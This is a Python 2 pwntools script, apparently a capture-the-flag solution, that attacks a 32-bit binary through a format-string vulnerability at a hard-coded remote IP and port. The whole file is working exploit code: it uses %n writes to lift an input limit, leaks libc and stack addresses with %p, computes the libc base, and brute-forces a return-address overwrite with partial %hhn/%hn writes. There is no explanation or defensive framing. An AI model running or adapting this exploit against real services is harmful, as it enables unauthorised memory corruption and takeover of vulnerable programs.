from pwn import *

for i in range(0, 0xff):
    with context.local(log_level = 'error'):
        try:
            elf = ELF('./main', checksec=False)
            #p = elf.process()
            #libc = ELF('/usr/lib32/libc.so.6', checksec=False)
            
            p = remote('54.225.38.91', 1026)
            libc = ELF('libc6_2.30-0ubuntu2_i386.so', checksec=False)
            

            # make it unlimited
            p.sendlineafter('name\n', p32(0x804c010)+'%6$n')

            # leak
            p.sendlineafter('name\n', '%2$p|%25$p')
            leak =  p.recvline().strip().split('|')
            # stack frame, return address - 0x98
            stack = eval(leak[1]) - (i+1)
            leak = eval(leak[0])
            libc.address = leak - libc.sym['_IO_2_1_stdin_']
            one_gadget = libc.sym['puts']

            log.info('stack/ret     : 0x%x'%stack)
            log.info('_IO_2_1_stdin_: 0x%x'%leak)
            log.info('libc base     : 0x%x'%libc.address)
            log.info('one_gadget    : 0x%x'%one_gadget)

            # overwrite => 0x804bfe0
            addr_1 = eval('0x' + hex(one_gadget)[-2:])  
            addr_2 = eval('0x' + hex(one_gadget)[-6:-4] + hex(one_gadget)[-4:-2])

            payload = ''.join([
                p32(stack+0),
                p32(stack+1),

                '%{:d}x'.format(addr_1 - 0x8),'%6$hhn',
                '%{:d}x'.format(addr_2 - (addr_1)),'%7$hn',
            ])

            p.sendlineafter('name\n', payload)
            p.sendlineafter('name\n', '')
            print i,
            res = p.recvlines(2)
            if len(res) == 2:
                print res
                break
        except:
            p.close()